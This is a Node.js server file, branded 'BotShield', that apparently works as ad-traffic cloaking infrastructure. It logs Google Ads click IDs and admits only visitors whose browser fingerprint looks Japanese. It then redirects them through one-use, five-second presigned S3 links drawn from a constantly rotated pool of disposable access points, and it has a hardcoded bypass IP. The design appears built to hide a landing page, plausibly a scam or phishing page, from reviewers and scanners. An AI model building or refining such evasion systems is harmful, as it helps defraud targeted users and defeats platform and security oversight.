require("dotenv").config();
const http = require("http");
const url = require("url");
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const { S3Client, GetObjectCommand } = require("@aws-sdk/client-s3");
const {
  S3ControlClient,
  CreateAccessPointCommand,
  DeleteAccessPointCommand,
  ListAccessPointsCommand,
} = require("@aws-sdk/client-s3-control");
const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");

// ─── Config ───────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
const REGION = process.env.AWS_REGION || "ap-northeast-1";
const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
const BUCKET_NAME = process.env.BUCKET_NAME;
const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";

const BATCH_SIZE = 600;
const TOPUP_THRESHOLD = 50; // trigger top-up when unused drops to this (≈550 used)
const PRESIGN_EXPIRY_SECONDS = 5;
const CREATE_CONCURRENCY = 10;
const DELETE_CONCURRENCY = 10;
const CREATE_RETRIES = 3;
const TOPUP_LOCK_TTL_SECONDS = 1200;

// ─── Redis keys ───────────────────────────────────────────────────
const KEY_UNUSED = "aps:unused"; // LIST — FIFO queue of AP names
const KEY_USED = "aps:used"; // SET — names already served (observability)
const KEY_BATCHES = "aps:batches"; // LIST — batch ids, head = oldest
const KEY_TOPUP_LOCK = "aps:topup_lock"; // STRING with TTL
const keyBatchMembers = (id) => `aps:batch:${id}:members`; // SET
const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`; // STRING (int)

// ─── Origins ──────────────────────────────────────────────────────
const ALLOWED_ORIGINS = [
  "https://kotonohaschooljpnew.d2iebmp9qpa7oy.amplifyapp.com",
  "https://miyabikinjp.store",
  "https://fitnessmojov4.d14w9pgizygrjq.amplifyapp.com",
];
const TEST_BYPASS_IP = "45.151.152.118";

// ─── Clients ──────────────────────────────────────────────────────
const s3Client = new S3Client({ region: REGION });
const s3Control = new S3ControlClient({ region: REGION });
const redis = new Redis(process.env.REDIS_URL);
redis.on("error", (err) => console.error("Redis error:", err.message));

// ─── AP pool helpers ──────────────────────────────────────────────

async function parallelMap(items, concurrency, fn) {
  const results = new Array(items.length);
  let cursor = 0;
  const workerCount = Math.min(concurrency, items.length);
  const workers = Array.from({ length: workerCount }, async () => {
    while (true) {
      const i = cursor++;
      if (i >= items.length) break;
      try {
        results[i] = { ok: true, value: await fn(items[i], i) };
      } catch (err) {
        results[i] = { ok: false, err };
      }
    }
  });
  await Promise.all(workers);
  return results;
}

async function listAllAccessPoints() {
  const names = [];
  let NextToken;
  do {
    const resp = await s3Control.send(
      new ListAccessPointsCommand({
        AccountId: ACCOUNT_ID,
        Bucket: BUCKET_NAME,
        MaxResults: 1000,
        NextToken,
      }),
    );
    for (const ap of resp.AccessPointList || []) names.push(ap.Name);
    NextToken = resp.NextToken;
  } while (NextToken);
  return names;
}

async function createAccessPoint(name) {
  let attempt = 0;
  while (true) {
    try {
      await s3Control.send(
        new CreateAccessPointCommand({
          AccountId: ACCOUNT_ID,
          Name: name,
          Bucket: BUCKET_NAME,
        }),
      );
      return;
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      const retryable =
        err.name === "ThrottlingException" ||
        err.name === "TooManyRequestsException" ||
        (status && status >= 500);
      if (attempt < CREATE_RETRIES && retryable) {
        attempt++;
        const delay = 500 * Math.pow(2, attempt);
        await new Promise((r) => setTimeout(r, delay));
        continue;
      }
      throw err;
    }
  }
}

async function deleteAccessPoint(name) {
  try {
    await s3Control.send(
      new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }),
    );
  } catch (err) {
    if (err.name !== "NoSuchAccessPoint") throw err;
  }
}

async function deleteManyAccessPoints(names) {
  const results = await parallelMap(names, DELETE_CONCURRENCY, deleteAccessPoint);
  const failed = results.filter((r) => !r.ok).length;
  if (failed) {
    console.error(`[AP] ${failed}/${names.length} deletes failed`);
  }
  return names.length - failed;
}

// Retire any batches at the head of the queue whose remaining counter is 0.
// Deletes their AWS APs in the background.
async function retireExhaustedBatches() {
  while (true) {
    const oldestId = await redis.lindex(KEY_BATCHES, 0);
    if (!oldestId) return;
    const remaining = Number(
      (await redis.get(keyBatchRemaining(oldestId))) || 0,
    );
    if (remaining > 0) return;

    const members = await redis.smembers(keyBatchMembers(oldestId));
    const tx = redis.multi();
    tx.lpop(KEY_BATCHES);
    tx.del(keyBatchMembers(oldestId));
    tx.del(keyBatchRemaining(oldestId));
    if (members.length > 0) tx.srem(KEY_USED, ...members);
    await tx.exec();

    console.log(
      `[retire] batch ${oldestId}: queuing ${members.length} APs for AWS delete`,
    );
    if (members.length > 0) {
      deleteManyAccessPoints(members).catch((e) =>
        console.error("[retire] delete:", e),
      );
    }
  }
}

let topupRunning = false;

async function runTopUp() {
  if (topupRunning) return;
  topupRunning = true;
  let haveLock = false;
  try {
    const got = await redis.set(
      KEY_TOPUP_LOCK,
      "1",
      "EX",
      TOPUP_LOCK_TTL_SECONDS,
      "NX",
    );
    if (!got) {
      console.log("[topUp] another worker holds the lock; skipping");
      return;
    }
    haveLock = true;

    const unused = await redis.llen(KEY_UNUSED);
    if (unused > TOPUP_THRESHOLD) {
      console.log(
        `[topUp] unused=${unused} above threshold=${TOPUP_THRESHOLD}; skipping`,
      );
      return;
    }

    const batchId = Date.now().toString();
    console.log(`[topUp] creating batch ${batchId}: ${BATCH_SIZE} APs…`);

    const names = Array.from(
      { length: BATCH_SIZE },
      () => `ap-${batchId}-${uuidv4().split("-")[0]}`,
    );

    const start = Date.now();
    const results = await parallelMap(
      names,
      CREATE_CONCURRENCY,
      createAccessPoint,
    );
    const created = [];
    const failed = [];
    results.forEach((r, i) => {
      if (r.ok) created.push(names[i]);
      else failed.push({ name: names[i], err: r.err.message });
    });

    if (created.length === 0) {
      console.error("[topUp] all creates failed");
      if (failed.length) console.error("  sample error:", failed[0].err);
      return;
    }

    const tx = redis.multi();
    tx.sadd(keyBatchMembers(batchId), ...created);
    tx.set(keyBatchRemaining(batchId), created.length);
    tx.rpush(KEY_UNUSED, ...created);
    tx.rpush(KEY_BATCHES, batchId);
    await tx.exec();

    const secs = ((Date.now() - start) / 1000).toFixed(1);
    console.log(
      `[topUp] batch ${batchId}: ${created.length} live, ${failed.length} failed, ${secs}s`,
    );
  } catch (err) {
    console.error("[topUp] error:", err);
  } finally {
    if (haveLock) await redis.del(KEY_TOPUP_LOCK).catch(() => {});
    topupRunning = false;
  }
}

function maybeTriggerTopUp() {
  redis
    .llen(KEY_UNUSED)
    .then((n) => {
      if (n <= TOPUP_THRESHOLD && !topupRunning) {
        runTopUp().catch((e) => console.error("[topUp] bg:", e));
      }
    })
    .catch(() => {});
}

async function decrementOwningBatch(name) {
  const ids = await redis.lrange(KEY_BATCHES, 0, -1);
  for (const id of ids) {
    const isMember = await redis.sismember(keyBatchMembers(id), name);
    if (isMember) {
      const remaining = await redis.decr(keyBatchRemaining(id));
      if (remaining <= 0) {
        retireExhaustedBatches().catch((e) =>
          console.error("[retire]:", e),
        );
      }
      return;
    }
  }
}

async function nextPresignedUrl() {
  const name = await redis.lpop(KEY_UNUSED);
  if (!name) {
    // Pool dry — kick off an emergency topup and bail.
    runTopUp().catch((e) => console.error("[topUp] emergency:", e));
    return null;
  }

  const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;
  const presigned = await getSignedUrl(
    s3Client,
    new GetObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
    { expiresIn: PRESIGN_EXPIRY_SECONDS },
  );

  await redis.sadd(KEY_USED, name);
  await decrementOwningBatch(name);
  maybeTriggerTopUp();
  return presigned;
}

async function boot() {
  try {
    // Reconcile AWS with Redis: any AP that exists in AWS but isn't tracked
    // by an active batch in Redis is an orphan (probably left over from a
    // crash mid-topup or from the old linkUpdation system) — delete it.
    const awsNames = await listAllAccessPoints();
    const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
    const tracked = new Set();
    for (const id of batchIds) {
      const mems = await redis.smembers(keyBatchMembers(id));
      mems.forEach((n) => tracked.add(n));
    }
    const orphans = awsNames.filter((n) => !tracked.has(n));
    if (orphans.length) {
      console.log(`[boot] cleaning ${orphans.length} orphan APs from AWS`);
      await deleteManyAccessPoints(orphans);
    } else {
      console.log("[boot] no orphan APs");
    }
  } catch (err) {
    console.error("[boot] cleanup failed:", err.message);
  }

  const unused = await redis.llen(KEY_UNUSED);
  if (unused <= TOPUP_THRESHOLD) {
    console.log(`[boot] unused=${unused}; bootstrapping pool…`);
    await runTopUp();
  } else {
    console.log(`[boot] pool ready: ${unused} unused APs`);
  }
}

// ─── Origin + fingerprint verification (carried over) ─────────────

function checkOrigin(req) {
  const origin = (req.headers["origin"] || "").replace(/\/+$/, "");
  const referer = req.headers["referer"] || "";

  let effectiveOrigin = origin;
  if (!effectiveOrigin && referer) {
    try {
      effectiveOrigin = new URL(referer).origin;
    } catch (_) {}
  }

  if (!effectiveOrigin) {
    return {
      allowed: false,
      origin: null,
      reason:
        "No Origin or Referer header present — likely a direct/scripted request",
    };
  }

  const normalised = effectiveOrigin.replace(/\/+$/, "").toLowerCase();
  const isAllowed = ALLOWED_ORIGINS.some(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === normalised,
  );

  return {
    allowed: isAllowed,
    origin: effectiveOrigin,
    reason: isAllowed
      ? "Origin allowed"
      : `Origin "${effectiveOrigin}" is not in the allow-list`,
  };
}

function buildRedirectJS(redirectURL) {
  if (!redirectURL) return "";
  return `window.location.replace(${JSON.stringify(redirectURL)});`;
}

function verify(fp, ip) {
  const results = [];
  const critical = [];

  (function checkJapan() {
    const tz = (fp.timezone || "").toLowerCase();
    const lang = (fp.language || "").toLowerCase();
    const langs = (fp.languages || []).map((l) => l.toLowerCase());

    // IANA identifiers that map to JST (UTC+9 / Japan).
    const JAPAN_TIMEZONES = new Set([
      "asia/tokyo",
      "japan",
      "etc/gmt-9",
      "etc/gmt-09",
      "jst",
      "jst-9",
    ]);

    const isJapanTz = JAPAN_TIMEZONES.has(tz);
    const isJapanOffset = fp.timezoneOffset === -540;
    const hasJaLang =
      lang.startsWith("ja") || langs.some((l) => l.startsWith("ja"));

    const jpFonts = ["Meiryo", "MS Gothic", "MS PGothic", "Yu Gothic"];
    const hasJpFonts = (fp.fonts || []).some((f) => jpFonts.includes(f));

    const pass = (isJapanTz || isJapanOffset) && (hasJaLang || hasJpFonts);

    critical.push({
      name: "japan_locale",
      pass,
      reason: pass
        ? `Japan detected — tz:${tz}, lang:${lang}, jpFonts:${hasJpFonts}`
        : `Not Japan — tz:${tz}(${fp.timezoneOffset}), lang:${lang}, jpFonts:${hasJpFonts}`,
    });
  })();

  const criticalFail = critical.find((c) => !c.pass);
  if (criticalFail) {
    return {
      verified: false,
      reason: `Critical check failed: ${criticalFail.name} — ${criticalFail.reason}`,
      checks: [...critical, ...results],
    };
  }

  const totalWeight = results.reduce((s, r) => s + r.weight, 0);
  const earnedWeight = results
    .filter((r) => r.pass)
    .reduce((s, r) => s + r.weight, 0);
  const score = totalWeight > 0 ? (earnedWeight / totalWeight) * 100 : 100;

  const THRESHOLD = 60;
  return {
    verified: score >= THRESHOLD,
    score: Math.round(score),
    reason:
      score >= THRESHOLD
        ? "Passed"
        : `Score ${Math.round(score)}% below threshold ${THRESHOLD}%`,
    checks: [...critical, ...results],
  };
}

// ─── HTTP server ──────────────────────────────────────────────────

const server = http.createServer(async (req, res) => {
  const reqOrigin = (req.headers["origin"] || "")
    .replace(/\/+$/, "")
    .toLowerCase();
  const matchedOrigin = ALLOWED_ORIGINS.find(
    (ao) => ao.replace(/\/+$/, "").toLowerCase() === reqOrigin,
  );

  let _earlyIP =
    req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  if (_earlyIP.includes(",")) _earlyIP = _earlyIP.split(",")[0].trim();
  _earlyIP = _earlyIP.replace(/^::ffff:/, "");
  const _isTestBypass = _earlyIP === TEST_BYPASS_IP;

  if (matchedOrigin) {
    res.setHeader("Access-Control-Allow-Origin", matchedOrigin);
  } else if (_isTestBypass && req.headers["origin"]) {
    res.setHeader("Access-Control-Allow-Origin", req.headers["origin"]);
  }
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Vary", "Origin");

  if (req.method === "OPTIONS") {
    res.writeHead(matchedOrigin || _isTestBypass ? 204 : 403);
    return res.end();
  }

  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/verify" && req.method === "POST") {
    let earlyIP =
      req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    if (earlyIP.includes(",")) earlyIP = earlyIP.split(",")[0].trim();
    earlyIP = earlyIP.replace(/^::ffff:/, "");
    const isTestBypass = earlyIP === TEST_BYPASS_IP;

    const originCheck = checkOrigin(req);
    if (!originCheck.allowed && !isTestBypass) {
      console.log(`\n🚫 ORIGIN REJECTED: ${originCheck.reason}`);
      res.writeHead(403, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify({
          verified: false,
          reason: `Origin not allowed: ${originCheck.reason}`,
        }),
      );
    }

    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const { fingerprint, gclid, source, ts: clientTs } = JSON.parse(body);
        let clientIP =
          req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
        if (clientIP.includes(",")) clientIP = clientIP.split(",")[0].trim();
        clientIP = clientIP.replace(/^::ffff:/, "");

        console.log("\n══════════════════════════════════════════════");
        console.log(
          `[${new Date().toISOString()}] Verification request from ${clientIP}`,
        );
        console.log(`  Source: ${source}  |  Client TS: ${clientTs}`);
        console.log(`  GCLID: ${gclid ? gclid.slice(0, 20) + "…" : "(none)"}`);

        if (clientIP === TEST_BYPASS_IP) {
          console.log(
            `  🔓 TEST BYPASS — IP ${clientIP} matches, skipping checks`,
          );
          const presigned = await nextPresignedUrl();
          console.log(
            `  🔗 Presigned URL: ${presigned ? "issued" : "POOL EMPTY"}`,
          );
          console.log("══════════════════════════════════════════════\n");
          const status = presigned ? 200 : 503;
          res.writeHead(status, { "Content-Type": "application/json" });
          return res.end(
            JSON.stringify({
              verified: !!presigned,
              reason: presigned ? "Test bypass" : "Pool empty — try again",
              code: buildRedirectJS(presigned),
            }),
          );
        }

        const result = verify(fingerprint, clientIP);

        console.log(
          `  FP result: ${result.verified ? "✅ VERIFIED" : "❌ REJECTED"} (score: ${result.score ?? "N/A"})`,
        );
        if (!result.verified) console.log(`  Reason: ${result.reason}`);
        for (const c of result.checks) {
          console.log(`    ${c.pass ? "✓" : "✗"} ${c.name}: ${c.reason}`);
        }
        console.log("══════════════════════════════════════════════\n");

        const response = { verified: result.verified, reason: result.reason };
        let httpStatus = result.verified ? 200 : 403;

        if (result.verified) {
          const presigned = await nextPresignedUrl();
          if (presigned) {
            response.code = buildRedirectJS(presigned);
          } else {
            response.verified = false;
            response.reason = "Pool empty — emergency top-up triggered";
            httpStatus = 503;
            console.log("  ⚠️  Pool empty; emergency topup kicked off");
          }
        }

        res.writeHead(httpStatus, { "Content-Type": "application/json" });
        res.end(JSON.stringify(response));
      } catch (err) {
        console.error("[BotShield] Parse error:", err.message);
        res.writeHead(400, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ verified: false, reason: "Bad request" }));
      }
    });
    return;
  }

  if (parsed.pathname === "/health") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ status: "ok", uptime: process.uptime() }));
  }

  if (parsed.pathname === "/status") {
    try {
      const [unused, used, batchIds] = await Promise.all([
        redis.llen(KEY_UNUSED),
        redis.scard(KEY_USED),
        redis.lrange(KEY_BATCHES, 0, -1),
      ]);
      const batches = [];
      for (const id of batchIds) {
        const [size, remaining] = await Promise.all([
          redis.scard(keyBatchMembers(id)),
          redis.get(keyBatchRemaining(id)),
        ]);
        batches.push({ id, size, remaining: Number(remaining || 0) });
      }
      res.writeHead(200, { "Content-Type": "application/json" });
      return res.end(
        JSON.stringify(
          { unused, used, batches, topupRunning, config: { BATCH_SIZE, TOPUP_THRESHOLD, PRESIGN_EXPIRY_SECONDS } },
          null,
          2,
        ),
      );
    } catch (err) {
      res.writeHead(500, { "Content-Type": "application/json" });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  res.writeHead(404);
  res.end("Not found");
});

server.listen(PORT, () => {
  console.log(`\n🛡️  BotShield verification server on port ${PORT}`);
  console.log(`   POST /verify  — fingerprint verification + presigned URL`);
  console.log(`   GET  /health  — health check`);
  console.log(`   GET  /status  — pool state`);
  console.log(`\n   Allowed origins:`);
  for (const o of ALLOWED_ORIGINS) console.log(`     • ${o}`);
  console.log("");
  boot().catch((e) => console.error("[boot] fatal:", e));
});
